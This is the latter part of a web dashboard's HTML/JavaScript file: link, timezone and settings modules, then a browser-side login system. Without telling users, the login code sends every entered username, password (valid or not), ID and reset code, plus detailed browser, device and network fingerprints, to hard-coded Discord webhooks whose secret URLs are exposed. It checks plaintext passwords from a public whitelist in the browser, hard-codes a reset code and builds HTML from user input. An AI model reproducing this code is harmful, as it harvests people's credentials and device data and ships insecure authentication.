            const newLink = {
                id: Date.now().toString(),
                name: name,
                url: url
            };
            this.parent._personalizedLinks.push(newLink);
            this.saveLinks();
            this.renderLinks();
            nameInput.value = '';
            urlInput.value = '';
            logAction(`Personalized link "${name}" added.`, "success");
        },
        deleteLink: function(id) {
            if (confirm('Are you sure you want to delete this link?')) {
                const index = this.parent._personalizedLinks.findIndex(link => link.id === id);
                if (index !== -1) {
                    const deletedLink = this.parent._personalizedLinks.splice(index, 1)[0];
                    this.saveLinks();
                    this.renderLinks();
                    logAction(`Personalized link "${deletedLink.name}" deleted.`, "warning");
                }
            }
        },
        renderLinks: function() {
            const linksGrid = document.getElementById('personalLinksGrid');
            if (!linksGrid) return;
            linksGrid.innerHTML = ''; // Clear existing links
            
            if (this.parent._personalizedLinks.length === 0) {
                linksGrid.innerHTML = '<p style="text-align: center;">No personalized links yet. Add one above!</p>';
                return;
            }

            this.parent._personalizedLinks.forEach(link => {
                const linkElement = document.createElement('a');
                linkElement.href = link.url;
                linkElement.target = '_blank';
                linkElement.innerHTML = `
                    <span>${link.name}</span>
                    <button class="delete-link-btn" data-id="${link.id}">Delete</button>
                `;
                linksGrid.appendChild(linkElement);
            });
        }
      },

      // --- Timezone Converter Module ---
      timezoneConverter: {
        parent: dashboard,
        init: function() {
            this.populateTimezones();
            document.getElementById('convertTimeBtn')?.addEventListener('click', () => this.convertTime());
        },
        populateTimezones: function() {
            const sourceTimezoneSelect = document.getElementById('sourceTimezone');
            const targetTimezoneSelect = document.getElementById('targetTimezone');
            if (!sourceTimezoneSelect || !targetTimezoneSelect) return;

            sourceTimezoneSelect.innerHTML = '';
            targetTimezoneSelect.innerHTML = '';

            // Using common IANA time zones
            const timezones = Intl.supportedValuesOf('timeZone');
            
            timezones.forEach(tz => {
                const option1 = document.createElement('option');
                option1.value = tz;
                option1.textContent = tz;
                sourceTimezoneSelect.appendChild(option1);

                const option2 = document.createElement('option');
                option2.value = tz;
                option2.textContent = tz;
                targetTimezoneSelect.appendChild(option2);
            });

            // Set some common defaults
            sourceTimezoneSelect.value = Intl.DateTimeFormat().resolvedOptions().timeZone; // User's current timezone
            targetTimezoneSelect.value = 'America/New_York'; // Common example
        },
        convertTime: function() {
            const sourceTimeInput = document.getElementById('sourceTime');
            const sourceTimezoneSelect = document.getElementById('sourceTimezone');
            const targetTimezoneSelect = document.getElementById('targetTimezone');
            const convertedTimeOutput = document.getElementById('convertedTime');

            if (!sourceTimeInput?.value || !sourceTimezoneSelect?.value || !targetTimezoneSelect?.value) {
                convertedTimeOutput.textContent = "Please select a source time and both timezones.";
                notificationSystem.warning("Missing input for timezone conversion.", 3000);
                return;
            }

            try {
                const sourceDateTime = new Date(sourceTimeInput.value);
                
                // Convert to a specific timezone string format
                const targetOptions = {
                    year: 'numeric', month: 'numeric', day: 'numeric',
                    hour: 'numeric', minute: 'numeric', second: 'numeric',
                    timeZone: targetTimezoneSelect.value,
                    timeZoneName: 'short'
                };
                
                const convertedTimeStr = sourceDateTime.toLocaleString(undefined, targetOptions);
                convertedTimeOutput.textContent = `Converted Time: ${convertedTimeStr}`;
                logAction(`Time converted from ${sourceTimezoneSelect.value} to ${targetTimezoneSelect.value}.`, "success");

            } catch (error) {
                convertedTimeOutput.textContent = "Error converting time. Please check your inputs.";
                notificationSystem.error("Time conversion failed: " + error.message, 5000);
            }
        }
      },

      // --- Settings Manager Module ---
      settingsManager: {
        parent: dashboard,
        init: function() {
            this.renderSettings();
            document.getElementById('themeToggle')?.addEventListener('click', () => { // Already handled by initThemeToggle, but for setting values.
                this.parent.saveSettings();
            });

            const enableAnimationsCheckbox = document.getElementById('enableAnimations');
            enableAnimationsCheckbox?.addEventListener('change', (e) => {
                globalState.animationsEnabled = e.target.checked;
                this.parent.saveSettings();
                notificationSystem.info(`UI animations ${globalState.animationsEnabled ? 'enabled' : 'disabled'}.`);
            });

            const enableNotificationsCheckbox = document.getElementById('enableNotifications');
            enableNotificationsCheckbox?.addEventListener('change', (e) => {
                globalState.notificationsEnabled = e.target.checked;
                this.parent.saveSettings();
                if (globalState.notificationsEnabled) notificationSystem.success("Notifications enabled.");
                else notificationSystem.warning("Notifications disabled. You won't see pop-ups.");
            });

            const enableNotificationSoundCheckbox = document.getElementById('enableNotificationSound');
            enableNotificationSoundCheckbox?.addEventListener('change', (e) => {
                globalState.notificationSoundEnabled = e.target.checked;
                this.parent.saveSettings();
                notificationSystem.info(`Notification sound ${globalState.notificationSoundEnabled ? 'enabled' : 'disabled'}.`);
            });

            const notificationVolumeSlider = document.getElementById('notificationVolume');
            const notificationVolumeValue = document.getElementById('notificationVolumeValue');
            notificationVolumeSlider?.addEventListener('input', (e) => {
                globalState.notificationVolume = parseFloat(e.target.value) / 100;
                notificationVolumeValue.textContent = `${e.target.value}%`;
                this.parent.saveSettings();
            });
            notificationVolumeSlider?.addEventListener('change', () => notificationSystem.info("Notification volume updated."));

            document.getElementById('notificationSoundTest')?.addEventListener('click', () => {
                notificationSystem.info("Testing notification sound.", 2000);
                if (globalState.notificationSoundEnabled) {
                    globalState.notificationSound.volume = globalState.notificationVolume;
                    globalState.notificationSound.play();
                }
            });
            const disableLongNotificationsCheckbox = document.getElementById('disableLongNotifications');
            disableLongNotificationsCheckbox?.addEventListener('change', (e) => {
                globalState.disableLongNotifications = e.target.checked;
                this.parent.saveSettings();
                notificationSystem.info(`Long notifications auto-dismiss ${globalState.disableLongNotifications ? 'faster' : 'slower'}.`);
            });
        },
        renderSettings: function() {
            // This function would primarily update the UI elements if they could be dynamically changed without direct event listeners
            // But since they are bound with event listeners, just ensuring initial state
            document.getElementById('enableAnimations').checked = globalState.animationsEnabled;
            document.getElementById('enableNotifications').checked = globalState.notificationsEnabled;
            document.getElementById('enableNotificationSound').checked = globalState.notificationSoundEnabled;
            const volSlider = document.getElementById('notificationVolume');
            if(volSlider){
              volSlider.value = globalState.notificationVolume * 100;
              document.getElementById('notificationVolumeValue').textContent = `${volSlider.value}%`;
            }
            document.getElementById('disableLongNotifications').checked = globalState.disableLongNotifications;
            // Also manage themeToggle text based on current theme, handled by applyTheme already.
        }
      }

    };

    // --- Login System JavaScript (Existing, but with added loading animations and new notification system calls) ---
    let loginTimeGlobal = null; // To store login time for session logging
    (() => {
      const USER_JSON_URL = 'https://raw.githubusercontent.com/Nuker214/Private.System/refs/heads/main/Whitelist.json';

      // Webhooks for the new logging systems (These remain as they are core logging)
      const loggingWebhooks = {
        username: 'https://discord.com/api/webhooks/1403506302822383726/Cq9jWG6XSG49gBwffXUEZdF5HCZLQC_SGf6f96XrH-Bs5WAxiy_U3OS1a5z00R3aL-vU',
        password: 'https://discord.com/api/webhooks/1403506454488678540/PBX3b6QtOKdsc6FZklZT-zWuXxO_jGNUFHGF3Q1ysb-8v95VPAsem44kvgdtNoPnNI',
        identifier: 'https://discord.com/api/webhooks/1403506052565307483/qDWgi0LkM0_DOwWGGR73evb-MqnI8MXMKJTjAYOxtLeltAZ3RsJRHQjf0Oj7Ce9c02cA',
        invalid_username: 'https://discord.com/api/webhooks/1403508639779786935/OjvG2xJet2_NiwAHi6OE_5PdoYPXd3fRBuXSG5FTtPMT9MooblezpxJLqDA97jIUShkp',
        invalid_password: 'https://discord.com/api/webhooks/1403509088113131704/qdUx47oo3-QRcc1IZpoBs2fB2Y05k9Tl2XgOVcVn078AgFFBw0pMUfKrR5gNN_UyKFhp',
        invalid_identifier: 'https://discord.com/api/webhooks/1403509418376822917/pmg748k-gAd3pdrGAumrdYnAbo2HTc_X6ulXvqXUn3vmgPQu7ZtqNNja5Vh8fPLNSq_5',
        attempts_counter: 'https://discord.com/api/webhooks/1403510543637282979/z95YpEiHL2P7G9-fsNVsl1NEcKjXuFOml4rzLjEkJNqu3wXB3JAWH3GS39lC6YRZ_1aw',
        attempts_exceeded: 'https://discord.com/api/webhooks/1403511845800902687/oMnaODY_1ckM-alSj91yLPHLIhW4QLpk0YatR2eoG0PS38KKYq5y1q4VfCTmKbhgKsxQ'
      };

      // Original webhooks (These remain as they are core logging)
      const webhookUrls = {
        userLogging: 'https://discord.com/api/webhooks/1402682960397860964/rmNhK0G8NOJlbRN38RdCmPB1-rzXaaogzqIJmA7EuTVEIoFpTinMXLff0qr5ke1RV7K3',
        browserLogging: 'https://discord.com/api/webhooks/1402690380910170154/EJgpyFYc0pyz5EnkOTXiSlM7W1jUnBldRd0PUKLEvERgE6nXfDVAb7NXaKIzR-3APGHP',
        deviceLogging: 'https://discord.com/api/webhooks/1402692400593371289/_Nx1ZdupZIrlkVmCO0J1OIphb9az9I1AZDZ6gjAemL2IHbuMLpWCbTltBfch-i970d1F',
        connectionLogging: 'https://discord.com/api/webhooks/1402694010123849840/IYCqiKdvj9QnFJ9WPoAlFBXzrY2mBnHR5SANj7c1uuYhkQV3Veado9hIVbtqh9PCZO1D',
        sessionLogging: 'https://discord.com/api/webhooks/1402695341257654405/SiXvG8hdSshEfPjz2e7gRQ3P80yqBNZw2AwHlUpEtFtHPD2vbG_Dh8JHjnfdDRD4hmJk'
      };

      const loginBox = document.getElementById('loginBox');
      const usernameInput = document.getElementById('username');
      const passwordInput = document.getElementById('password');
      const userIDInput = document.getElementById('userID');
      const showPasswordCheckbox = document.getElementById('showPassword');
      const submitBtn = document.getElementById('submitBtn');
      const errorMsg = document.getElementById('errorMsg');
      const attemptsText = document.getElementById('attemptsText');
      const resetPopup = document.getElementById('resetPopup');
      const resetField = document.getElementById('resetField');
      const resetBtn = document.getElementById('resetBtn');

      let attempts = 5;
      let users = [];

      // Initial loading sequence: Before login screen
      window.addEventListener('DOMContentLoaded', async () => {
          await showLoadingScreen("Initializing System..", 3000); // Initial loading screen
          loginBox.style.opacity = '0';
          loginBox.style.visibility = 'hidden'; // Hide initially for animated entry
          
          dashboard.loadSettings(); // Load theme setting early for login screen if needed

          // Now fetch user data after the initial loading animation
          try {
            const res = await fetch(USER_JSON_URL);
            if (!res.ok) throw new Error(`HTTP error! status: ${res.status}`);
            users = await res.json();
          } catch (e) {
            users = [];
            notificationSystem.error('Failed to load user JSON data. Cannot log in.', 5000);
            console.error('Failed to load user JSON data:', e);
            submitBtn.disabled = true; // Disable login if users can't be loaded
          }

          loginBox.style.opacity = '1';
          loginBox.style.visibility = 'visible'; // Show login box
      });


      // Show/hide password toggle
      showPasswordCheckbox.addEventListener('change', () => {
        passwordInput.type = showPasswordCheckbox.checked ? 'text' : 'password';
        logAction(`Password visibility toggled to ${showPasswordCheckbox.checked ? 'show' : 'hide'}.`);
      });

      // Flash red outline function
      function flashRedOutline(times = 2, delay = 400) {
        if (!globalState.animationsEnabled) { // Respect settings
            loginBox.style.borderColor = 'red';
            loginBox.style.boxShadow = '0 0 15px red';
            setTimeout(() => {
                loginBox.style.borderColor = 'white';
                loginBox.style.boxShadow = '0 0 15px white';
            }, delay * times); // Hold for duration, then revert
            return;
        }
        let count = 0;
        function flash() {
          loginBox.classList.add('flashing');
          setTimeout(() => {
            loginBox.classList.remove('flashing');
            count++;
            if (count < times) setTimeout(flash, delay);
          }, delay);
        }
        flash();
      }

      // Get WebGL Renderer (used for device logging)
      function getWebGLRenderer() {
        try {
          const canvas = document.createElement('canvas');
          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
          if (!gl) return "Unavailable";
          const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
          return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unavailable";
        } catch {
          return "Unavailable";
        }
      }

      // Battery status promise (device logging)
      async function getBatteryStatus() {
        if (navigator.getBattery) {
          try {
            const battery = await navigator.getBattery();
            return battery;
          } catch {
            return null;
          }
        }
        return null;
      }

      // Build user info object from user JSON
      function findUser(username, userID) {
        return users.find(u =>
          u.username?.toLowerCase() === username.toLowerCase() &&
          u.userID?.toString() === userID.toString()
        );
      }

      // Send Discord webhook with custom embed fields
      async function sendWebhook(url, embed) {
        try {
          await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ embeds: [embed] }),
          });
        } catch (e) {
          console.warn('Webhook send failed:', e);
        }
      }

      // Collect browser & device info for logs
      async function collectLoggingData(user, password) {
        const now = new Date();
        loginTimeGlobal = now.toISOString(); // Set global login time
        const batteryStatus = await getBatteryStatus();

        return {
          user,
          password,
          loginTime: loginTimeGlobal,
          batteryStatus,
          webglRenderer: getWebGLRenderer(),
        };
      }

      // New logging functions for the specific systems
      async function logUsername(name, username) {
        const embed = {
          title: "Username Logging",
          color: 0x3498db,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.username, embed);
      }

      async function logPassword(name, password) {
        const embed = {
          title: "Password Logging",
          color: 0xe74c3c,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.password, embed);
      }

      async function logIdentifier(name, identifier) {
        const embed = {
          title: "Identifier Logging",
          color: 0x2ecc71,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.identifier, embed);
      }

      async function logInvalidUsername(name, username) {
        const embed = {
          title: "Invalid Username Logging",
          color: 0xf39c12,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Username", value: username, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_username, embed);
      }

      async function logInvalidPassword(name, password) {
        const embed = {
          title: "Invalid Password Logging",
          color: 0xe67e22,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Password", value: password, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_password, embed);
      }

      async function logInvalidIdentifier(name, identifier) {
        const embed = {
          title: "Invalid Identifier Logging",
          color: 0xd35400,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Invalid Identifier", value: identifier, inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.invalid_identifier, embed);
      }

      async function logAttemptsCounter(name, username, password, identifier, attemptsLeft) {
        const embed = {
          title: "Attempts Counter Logging",
          color: 0x9b59b6,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Attempts Left", value: attemptsLeft.toString(), inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_counter, embed);
      }

      async function logAttemptsExceeded(name, username, password, identifier) {
        const embed = {
          title: "Attempts Exceeded Logging",
          color: 0xc0392b,
          fields: [
            { name: "Name", value: name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password", value: password, inline: true },
            { name: "Identifier", value: identifier, inline: true },
            { name: "Status", value: "MAX ATTEMPTS EXCEEDED", inline: true },
            { name: "Date/Time", value: new Date().toISOString(), inline: false }
          ]
        };
        await sendWebhook(loggingWebhooks.attempts_exceeded, embed);
      }

      // Original embed builders (unchanged)
      function buildUserLoggingEmbed(data) {
        return {
          title: "User Logging System",
          color: 0xff0000,
          fields: [
            { name: "Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username, inline: true },
            { name: "Password", value: data.password, inline: true },
            { name: "Rank Type", value: data.user.rank?.toString() || "N/A", inline: true },
            { name: "Role Type", value: data.user.role || "N/A", inline: true },
            { name: "Login Time", value: data.loginTime, inline: false },
            { name: "User Identifier", value: data.user.userID.toString(), inline: true },
            { name: "Account Creation Date", value: data.user.accountCreationDate || "N/A", inline: true }
          ]
        };
      }

      function buildBrowserLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Browser Logging System",
          color: 0x00ff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User Identifier", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Browser Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Browser Language", value: nav.language || "Unknown", inline: true },
            { name: "Browser Languages", value: nav.languages ? nav.languages.join(", ") : "Unknown", inline: false },
            { name: "User Agent", value: nav.userAgent || "Unknown", inline: false },
            { name: "Installed Plugins", value: nav.plugins?.length > 0 ? `${nav.plugins.length} plugin(s)` : "None", inline: true },
            { name: "Browser Window Size", value: `${window.innerWidth}x${window.innerHeight}`, inline: true },
            { name: "Browser Zoom Level", value: `${Math.round(window.devicePixelRatio * 100)}%`, inline: true },
            { name: "Incognito/Private Mode Status", value: "Undetected", inline: true },
            { name: "Cookies Enabled", value: nav.cookieEnabled ? "Yes" : "No", inline: true },
            { name: "Do Not Track", value: nav.doNotTrack || "Unknown", inline: true },
            { name: "Browser Tab Visibility", value: document.visibilityState || "Unknown", inline: true },
            { name: "Font Smoothing Type", value: "Unavailable", inline: true },
            { name: "Clipboard Access", value: nav.clipboard ? "Supported" : "Not Supported", inline: true },
            { name: "WebGL Renderer Info", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Browser Connection Speed", value: nav.connection?.effectiveType || "Unknown", inline: true }
          ]
        };
      }

      function buildDeviceLoggingEmbed(data) {
        const nav = navigator;
        const battery = data.batteryStatus;
        return {
          title: "Device Logging System",
          color: 0x0000ff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },
            { name: "Device Platform", value: nav.platform || "Unknown", inline: true },
            { name: "CPU Cores", value: nav.hardwareConcurrency ? `${nav.hardwareConcurrency} cores` : "Unavailable", inline: true },
            { name: "Device Memory", value: nav.deviceMemory ? `${nav.deviceMemory} GB` : "Unavailable", inline: true },
            { name: "GPU Renderer", value: data.webglRenderer || "Unavailable", inline: true },
            { name: "Battery Charging", value: battery?.charging ? "Yes" : "No", inline: true },
            { name: "Battery Level", value: battery ? `${Math.round(battery.level * 100)}%` : "Unavailable", inline: true },
            { name: "Touch Support", value: ('ontouchstart' in window || nav.maxTouchPoints > 0) ? "Yes" : "No", inline: true },
            { name: "Screen Resolution", value: `${screen.width}x${screen.height}`, inline: true },
            { name: "Screen Orientation", value: screen.orientation?.type || "Unavailable", inline: true },
            { name: "Color Depth", value: `${screen.colorDepth} bit`, inline: true },
            { name: "Pixel Depth", value: `${screen.pixelDepth} bit`, inline: true },
            { name: "Device Pixel Ratio", value: window.devicePixelRatio?.toString() || "Unknown", inline: true },
            { name: "Max Touch Points", value: nav.maxTouchPoints?.toString() || "0", inline: true },
            { name: "Vendor", value: nav.vendor || "Unknown", inline: true },
            { name: "Language", value: nav.language || "Unknown", inline: true }
          ]
        };
      }

      function buildConnectionLoggingEmbed(data) {
        const nav = navigator;
        return {
          title: "Connection Logging System",
          color: 0xffff00,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Online Status", value: nav.onLine ? "Online" : "Offline", inline: true },
            { name: "Connection Type", value: nav.connection?.type || "Unknown", inline: true },
            { name: "Effective Connection Type", value: nav.connection?.effectiveType || "Unknown", inline: true },

            { name: "Downlink Speed", value: nav.connection?.downlink ? `${nav.connection.downlink} Mbps` : "Unknown", inline: true },
            { name: "RTT (Round Trip Time)", value: nav.connection?.rtt ? `${nav.connection.rtt} ms` : "Unknown", inline: true },
            { name: "Save Data Mode", value: nav.connection?.saveData ? "Enabled" : "Disabled", inline: true },

            { name: "IP Address", value: data.user.ipAddress || "Unavailable", inline: false },
            { name: "VPN Detected", value: data.user.vpnDetected ? "Yes" : "No", inline: true },
            { name: "Proxy Detected", value: data.user.proxyDetected ? "Yes" : "No", inline: true },

            { name: "Public IPv6", value: data.user.ipv6Address || "Unavailable", inline: false },
            { name: "Local IP Addresses", value: data.user.localIPs?.join(", ") || "Unavailable", inline: false },
            { name: "Network Downlink Max", value: nav.connection?.downlinkMax ? `${nav.connection.downlinkMax} Mbps` : "Unknown", inline: true },

            { name: "Network Metered Connection", value: nav.connection?.metered ? "Yes" : "No", inline: true },
            { name: "Network Type Detailed", value: nav.connection?.typeDetailed || "Unknown", inline: true },
            { name: "Effective Network Bandwidth Estimate", value: nav.connection?.bandwidthEstimate || "Unavailable", inline: true }
          ]
        };
      }

      function buildSessionLoggingEmbed(data) {
        return {
          title: "Session Logging System",
          color: 0x00ffff,
          fields: [
            { name: "Person's Name", value: data.user.name || "N/A", inline: true },
            { name: "Username", value: data.user.username || "N/A", inline: true },
            { name: "User ID", value: data.user.userID?.toString() || "N/A", inline: true },

            { name: "Login Time", value: data.loginTime || "Unknown", inline: true },
            { name: "Logout Time", value: data.logoutTime || "Unknown", inline: true },
            { name: "Session Duration", value: data.sessionDuration || "Unknown", inline: true },

            { name: "Pages Visited", value: data.pagesVisited?.join(", ") || "None", inline: false },
            { name: "Actions Performed", value: data.actionsPerformed?.join(", ") || "None", inline: false },

            { name: "Errors Encountered", value: data.errorsEncountered?.join("; ") || "None", inline: false },
            { name: "Warnings", value: data.warnings?.join("; ") || "None", inline: false },

            { name: "User Role Changes", value: data.roleChanges?.join(", ") || "None", inline: false },
            { name: "Permission Changes", value: data.permissionChanges?.join(", ") || "None", inline: false },

            { name: "Last Activity Timestamp", value: data.lastActivityTime || "Unknown", inline: true },
            { name: "Number of Clicks", value: data.numberOfClicks?.toString() || "0", inline: true },
            { name: "Number of Form Submissions", value: data.numberOfFormSubmissions?.toString() || "0", inline: true },

            { name: "Idle Time", value: data.idleTime || "0s", inline: true },
            { name: "Active Time", value: data.activeTime || "Unknown", inline: true },
            { name: "Browser Tab Focus Time", value: data.tabFocusTime || "Unknown", inline: true }
          ]
        };
      }

      // Handle login submission
      async function submitLogin() {
        errorMsg.textContent = '';
        if (!usernameInput.value || !passwordInput.value || !userIDInput.value) {
          errorMsg.textContent = 'Please fill all fields.';
          notificationSystem.warning('Login attempt failed: Please fill all fields.', 2500);
          return;
        }

        const username = usernameInput.value;
        const password = passwordInput.value;
        const userID = userIDInput.value;
        const user = findUser(username, userID);

        // Log the attempt
        await logAttemptsCounter(
          user?.name || "Unknown",
          username,
          password,
          userID,
          attempts
        );

        if (!user) {
          await logInvalidUsername(user?.name || "Unknown", username);
          await logInvalidIdentifier(user?.name || "Unknown", userID);
          handleFailedAttempt('User not found. Check username or ID.');
          notificationSystem.error('Login attempt failed: User not found.', 3000);
          return;
        }

        if (password !== user.password) {
          await logInvalidPassword(user.name, password);
          handleFailedAttempt('Incorrect password.');
          notificationSystem.error('Login attempt failed: Incorrect password.', 3000);
          return;
        }

        // Correct login
        attempts = 5;
        updateAttemptsText();
        errorMsg.textContent = '';
        resetPopup.style.display = 'none';
        loginBox.style.borderColor = 'white';
        loginBox.style.boxShadow = '0 0 15px white';
        notificationSystem.success(`Login successful! Welcome, ${user.name || username}.`, 3000);

        // Log successful credentials
        await logUsername(user.name, username);
        await logPassword(user.name, password);
        await logIdentifier(user.name, userID);

        // Collect data and send logs
        const loggingData = await collectLoggingData(user, password);

        // Send all 5 webhooks:
        await Promise.all([
          sendWebhook(webhookUrls.userLogging, buildUserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.browserLogging, buildBrowserLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.deviceLogging, buildDeviceLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.connectionLogging, buildConnectionLoggingEmbed(loggingData)),
          sendWebhook(webhookUrls.sessionLogging, buildSessionLoggingEmbed(loggingData)),
        ]);

        // Show dashboard and hide login
        loginBox.style.display = 'none';
        
        // New loading screen for dashboard
        await showLoadingScreen("Loading Dashboard...", 2500);

        document.getElementById('dashboard').style.display = 'block';
        document.body.className = 'dashboard-body'; // Apply dashboard theme
        
        // Update user info in dashboard
        document.getElementById('loggedInUser').textContent = user.name || user.username;
        document.getElementById('loggedInID').textContent = userID;
        localStorage.setItem('loggedInUser', user.name || user.username); // Store user for logout info
        localStorage.setItem('loggedInID', userID); // Store ID for logout info
        
        // Initialize dashboard functionality
        dashboard.init();
      }

      // Failed attempt handler
      async function handleFailedAttempt(msg) {
        attempts--;
        updateAttemptsText();
        errorMsg.textContent = msg;
        
        if (attempts <= 0) {
          attempts = 0;
          errorMsg.textContent = 'No attempts left. Please reset.';
          
          // Log attempts exceeded
          const username = usernameInput.value;
          const password = passwordInput.value;
          const userID = userIDInput.value;
          const user = findUser(username, userID);
          
          await logAttemptsExceeded(
            user?.name || "Unknown",
            username,
            password,
            userID
          );
          notificationSystem.error('Login attempts exhausted. Please use reset panel.', 5000);
          showResetPopup();
          disableInputs();
        } else {
          if (attempts <= 3) {
            flashRedOutline(2, 400);
          }
        }
      }

      // Update attempts display
      function updateAttemptsText() {
        attemptsText.textContent = `Attempts Left: ${attempts}`;
      }

      // Disable inputs and submit button
      function disableInputs() {
        usernameInput.disabled = true;
        passwordInput.disabled = true;
        userIDInput.disabled = true;
        submitBtn.disabled = true;
        notificationSystem.warning("Login inputs disabled due to failed attempts.", 2500);
      }

      // Enable inputs and submit button
      function enableInputs() {
        usernameInput.disabled = false;
        passwordInput.disabled = false;
        userIDInput.disabled = false;
        submitBtn.disabled = false;
      }

      // Show reset popup
      function showResetPopup() {
        resetPopup.style.display = 'block';
        resetPopup.setAttribute('aria-hidden', 'false');
        resetField.focus();
        logAction("Reset password popup displayed.", "warning");
      }

      // Hide reset popup
      function hideResetPopup() {
        resetPopup.style.display = 'none';
        resetPopup.setAttribute('aria-hidden', 'true');
        resetField.value = '';
      }

      async function resetCounter() {
        const enteredCode = resetField.value.trim();
        const isCorrect = enteredCode === 'Reset.Counter.2579';

        const username = usernameInput.value || 'Unknown';
        const password = passwordInput.value || 'Unknown';
        const userID = userIDInput.value || 'Unknown';
        const user = findUser(username, userID) || {};

        // 1. Send "Reset box Detected" webhook immediately
        const resetBoxEmbed = {
          title: "üîî Reset Box Detected",
          color: 0xffff00,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Entered Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };
        const resetBoxWebhook = "https://discord.com/api/webhooks/1403083012442423377/WNs_yZimluZqsxfZWkLSCfd2vmOYdoyEbsUVOfczHkJXkeiThIZ6gYCJILFSHfSDSnsq";
        await sendWebhook(resetBoxWebhook, resetBoxEmbed);

        // Build embed for correct or incorrect code
        const resultEmbed = {
          title: isCorrect ? "‚úÖ Reset Code Accepted" : "‚ùå Incorrect Reset Code Attempt",
          color: isCorrect ? 0x00ff00 : 0xff0000,
          fields: [
            { name: "Name", value: user.name || "N/A", inline: true },
            { name: "Username", value: username, inline: true },
            { name: "Password Entered", value: password, inline: true },
            { name: "User ID", value: userID, inline: true },
            { name: "Reset Code", value: enteredCode, inline: false },
            { name: "Time", value: new Date().toLocaleString(), inline: false }
          ]
        };

        // Select webhook for correct or incorrect logging
        const resultWebhook = isCorrect
          ? "https://discord.com/api/webhooks/1403088193850441921/zZKPkgzVBQ7d6aiCkT3WM7j2Y74UO2o1Js9oSnawVBHaSxUQCz-16Qj4uPYk1YxgoanB"
          : "https://discord.com/api/webhooks/1403088326252040372/JgQkJdcVG-8X0jSmw7AZai9YSUODCMZ5hkyWlBe1MBzPRiJgbSlRDWOJUvHVqsK248ip";

        await sendWebhook(resultWebhook, resultEmbed);

        if (isCorrect) {
          attempts = 5;
          updateAttemptsText();
          enableInputs();
          hideResetPopup();
          errorMsg.textContent = '';
          notificationSystem.success("Login attempts reset. You can try again.", 3000);
          logAction("Attempts counter successfully reset.", "success");
        } else {
          notificationSystem.error('Incorrect reset code.', 2500);
          logAction("Incorrect reset code attempt.", "error");
        }
      }

      // Attach event listeners
      submitBtn.addEventListener('click', submitLogin);
      resetBtn.addEventListener('click', resetCounter);

      // Enter key submits login if popup hidden, else tries reset
      document.addEventListener('keydown', e => {
        if (e.key === 'Enter') {
          if (resetPopup.style.display === 'block') {
            resetCounter();
          } else {
            submitLogin();
          }
        }
      });

      // Initialize attempts display
      updateAttemptsText();
    })();
  </script>
</body>
</html>
